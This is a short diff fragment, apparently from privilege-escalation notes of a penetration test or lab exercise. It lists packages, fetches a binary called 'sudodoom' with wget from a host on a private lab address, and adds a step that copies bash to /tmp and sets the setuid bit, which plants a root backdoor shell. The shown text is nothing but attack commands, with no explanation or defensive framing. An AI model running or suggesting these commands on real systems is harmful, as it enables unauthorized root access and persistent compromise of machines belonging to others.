@@ -62,3 +62,7 @@ dpkg -l
 ```shell 
 wget 192.168.45.x/sudodoom
 ```
+
+```bash
+cp /bin/bash /tmp/bash; chmod +s /tmp/bash
+```
